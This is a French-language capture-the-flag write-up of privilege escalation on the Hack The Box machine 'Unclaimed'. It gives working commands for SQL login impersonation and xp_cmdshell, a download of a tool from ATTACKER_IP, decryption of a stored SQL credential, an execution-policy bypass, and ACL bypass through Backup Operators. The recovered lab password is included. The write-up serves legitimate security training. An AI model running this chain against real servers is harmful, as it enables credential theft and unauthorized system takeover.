# HTB Unclaimed — Privilege Escalation (user → root)

> **Spoilers complets.** Ce document couvre uniquement la chaîne menée depuis l'accès obtenu en tant que `UNCLAIMED\svc_sql` jusqu'à la lecture de `root.txt`.

## 1. Point de départ : shell `svc_sql`

L'exploitation de l'application Web avait permis de contrôler les requêtes SQL, puis d'abuser de la chaîne d'impersonation suivante :

```text
svc_tracer_ro → svc_reports → sa
```

La chaîne pouvait être vérifiée avec :

```sql
EXECUTE AS LOGIN='svc_reports';
EXECUTE AS LOGIN='sa';
SELECT SUSER_SNAME() AS current_login,
       IS_SRVROLEMEMBER('sysadmin') AS sysadmin;
REVERT;
REVERT;
```

Le résultat confirmait une exécution sous `sa` avec le rôle `sysadmin`. `xp_cmdshell` donnait ensuite une exécution de commandes sous le compte de service SQL :

```sql
EXECUTE AS LOGIN='svc_reports';
EXECUTE AS LOGIN='sa';
EXEC master.dbo.xp_cmdshell 'whoami & hostname';
REVERT;
REVERT;
```

Résultat :

```text
unclaimed\svc_sql
unclaimed
```

Le premier shell Windows et le flag utilisateur ont ainsi été obtenus dans :

```powershell
Get-Content C:\Users\svc_sql\Desktop\user.txt
```

## 2. Énumération locale

Le compte `svc_sql` ne possédait aucun privilège Windows immédiatement exploitable :

```powershell
whoami /priv
whoami /groups
```

Privilèges notables :

```text
SeChangeNotifyPrivilege
SeCreateGlobalPrivilege
```

Il n'avait notamment pas `SeImpersonatePrivilege`, ce qui excluait les Potato classiques depuis ce contexte.

L'énumération des comptes locaux révéla cependant un compte intéressant :

```powershell
Get-LocalUser
net user svc_wtbackup
```

`svc_wtbackup` appartenait aux groupes suivants :

```text
Backup Operators
Remote Management Users
```

Il constituait donc une cible idéale : WinRM était accessible et `Backup Operators` permettrait de contourner les ACL pour lire le flag administrateur.

## 3. SQL Server et SQL Server Agent

Le service SQL Server fonctionnait sous `svc_sql`, tandis que SQL Server Agent utilisait un compte de service virtuel :

```powershell
sc.exe qc MSSQLSERVER
sc.exe qc SQLSERVERAGENT
```

```text
MSSQLSERVER    → .\svc_sql
SQLSERVERAGENT → NT SERVICE\SQLSERVERAGENT
```

Le compte Windows courant était `sysadmin` sur l'instance SQL locale :

```powershell
sqlcmd -S localhost -E -C -Q "SELECT SYSTEM_USER AS login_name,IS_SRVROLEMEMBER('sysadmin') AS sysadmin"
```

Un job SQL Agent `CmdExec` a également permis d'obtenir un shell sous :

```text
NT SERVICE\SQLSERVERAGENT
```

Ce pivot ne donnait toutefois pas directement SYSTEM. Le compte disposait de `SeAssignPrimaryTokenPrivilege`, mais pas de `SeImpersonatePrivilege`. Les essais avec SweetPotato (`EfsRpc`, `PrintSpoofer` et `WinRM`) n'ont pas abouti et constituaient une impasse.

## 4. Découverte du credential SQL

L'énumération des credentials SQL Server a révélé :

```sql
SELECT credential_id, name, credential_identity
FROM sys.credentials;
```

Résultat intéressant :

```text
Credential : WTArchiveCred
Identity   : UNCLAIMED\svc_wtbackup
```

Le credential était associé à un proxy SQL Agent destiné à un ancien job d'archivage :

```text
PIR Nightly Archive
WTArchiveProxy
UNCLAIMED\svc_wtbackup
```

L'exécution du job avec le proxy échouait avec un message indiquant un mauvais mot de passe. La piste était néanmoins correcte : le secret stocké devait être récupéré et déchiffré.

## 5. Déchiffrement de `WTArchiveCred`

Le module PowerShell `Get-MSSQLCredentialPasswords.psm1` a été transféré sur la cible :

```powershell
Invoke-WebRequest http://ATTACKER_IP:8000/Get-MSSQLCredentialPasswords.psm1 -UseBasicParsing -OutFile C:\Users\Public\Get-MSSQLCredentialPasswords.psm1
```

### 5.1 Correction de la connexion DAC

Le module échouait initialement pendant la connexion DAC avec une erreur TLS. La chaîne de connexion a été adaptée pour faire confiance au certificat et désactiver le chiffrement dans ce lab :

```powershell
$p='C:\Users\Public\Get-MSSQLCredentialPasswords.psm1'
$s=Get-Content $p -Raw
$s=$s.Replace('Encrypt=True','Encrypt=False')
[IO.File]::WriteAllText($p,$s)
```

Après cette modification, le module renvoyait seulement :

```text
W0rldTr@cer_
```

Ce mot de passe échouait sur WinRM et lors d'un test d'ouverture de session locale. Il semblait donc obsolète ou incomplet.

### 5.2 Cause réelle : `LEN()` tronquait le ciphertext

Le module utilisait cette logique pour extraire la partie chiffrée de `imageval` :

```sql
substring(imageval, ..., LEN(imageval) - ...)
```

Le problème est que `LEN()` appliqué à une valeur binaire ignore les octets nuls situés à la fin. Si le ciphertext se termine par `00`, son dernier octet est supprimé avant le déchiffrement.

Cela produisait exactement les symptômes observés :

- le début du mot de passe était correctement déchiffré ;
- le dernier bloc AES était corrompu ;
- la sortie brute contenait des caractères Unicode aléatoires après `W0rldTr@cer_` ;
- le mot de passe était présenté comme valide mais restait inutilisable.

La correction consistait à remplacer `LEN(imageval)` par `DATALENGTH(imageval)`, qui conserve tous les octets :

```powershell
$p='C:\Users\Public\Get-MSSQLCredentialPasswords.psm1'
$s=Get-Content $p -Raw
$s=$s.Replace(
  'len(imageval)-$($ivlen+4)',
  'datalength(imageval)-$($ivlen+4)'
)
[IO.File]::WriteAllText($p,$s)
```

Vérification de la modification :

```powershell
Select-String $p -Pattern 'substring\(imageval'
```

Le module a ensuite été relancé en contournant l'Execution Policy :

```powershell
powershell.exe -NoProfile -ExecutionPolicy Bypass -Command "Import-Module 'C:\Users\Public\Get-MSSQLCredentialPasswords.psm1' -Force; Get-MSSQLCredentialPasswords | Format-List Instance,Credential,User,Password"
```

Cette fois, le credential complet a été récupéré :

```text
Instance   : MSSQLSERVER
Credential : WTArchiveCred
User       : UNCLAIMED\svc_wtbackup
Password   : W0rldTr@cer_B@ckup1
```

## 6. Connexion WinRM avec `svc_wtbackup`

Les identifiants ont été validés depuis Kali :

```bash
nxc winrm 10.129.91.52 \
  -u svc_wtbackup \
  -p 'W0rldTr@cer_B@ckup1' \
  --local-auth
```

Résultat :

```text
[+] UNCLAIMED\svc_wtbackup:W0rldTr@cer_B@ckup1 (Pwn3d!)
```

Connexion interactive :

```bash
evil-winrm \
  -i 10.129.91.52 \
  -u svc_wtbackup \
  -p 'W0rldTr@cer_B@ckup1'
```

Le contexte obtenu confirmait les groupes attendus :

```powershell
whoami
whoami /groups
whoami /priv
```

```text
UNCLAIMED\svc_wtbackup
BUILTIN\Backup Operators
BUILTIN\Remote Management Users
```

Le message `Pwn3d!` de NetExec ne signifiait pas que le compte appartenait directement à `Administrators`. Il signalait ici un groupe privilégié, `Backup Operators`.

## 7. Lecture de `root.txt` avec `SeBackupPrivilege`

Le fichier était visible mais sa lecture directe était refusée :

```powershell
Get-Content C:\Users\Administrator\Desktop\root.txt
```

```text
Access to the path is denied.
```

Le groupe `Backup Operators` permet cependant d'utiliser la sémantique de sauvegarde pour contourner les ACL. `robocopy /B` a été utilisé pour copier le fichier vers un emplacement accessible :

```powershell
robocopy C:\Users\Administrator\Desktop C:\Users\Public root.txt /B /R:0 /W:0
```

Le flag root pouvait alors être lu :

```powershell
Get-Content C:\Users\Public\root.txt
```

La machine était compromise.

## 8. Résumé de la chaîne

```text
Shell svc_sql
  ↓
Sysadmin SQL local
  ↓
Énumération de sys.credentials
  ↓
WTArchiveCred → UNCLAIMED\svc_wtbackup
  ↓
Déchiffrement initial incomplet
  ↓
Correction LEN(imageval) → DATALENGTH(imageval)
  ↓
Mot de passe complet : W0rldTr@cer_B@ckup1
  ↓
WinRM sous svc_wtbackup
  ↓
Backup Operators / SeBackupPrivilege
  ↓
robocopy /B de root.txt
  ↓
ROOT
```

## 9. Points clés

1. Un credential SQL Server peut contenir le secret d'un compte Windows plus privilégié.
2. Une erreur de déchiffrement partielle ne signifie pas nécessairement que le secret est obsolète.
3. `LEN()` et `DATALENGTH()` n'ont pas le même comportement sur les données binaires.
4. La suppression d'un seul octet du ciphertext suffit à corrompre tout le dernier bloc AES.
5. `Backup Operators` ne donne pas forcément une lecture directe des fichiers protégés, mais permet de contourner les ACL via les API et outils de sauvegarde.
6. Les pivots SQL Agent et Potato étaient utiles pour l'énumération, mais n'étaient pas nécessaires à la chaîne finale.

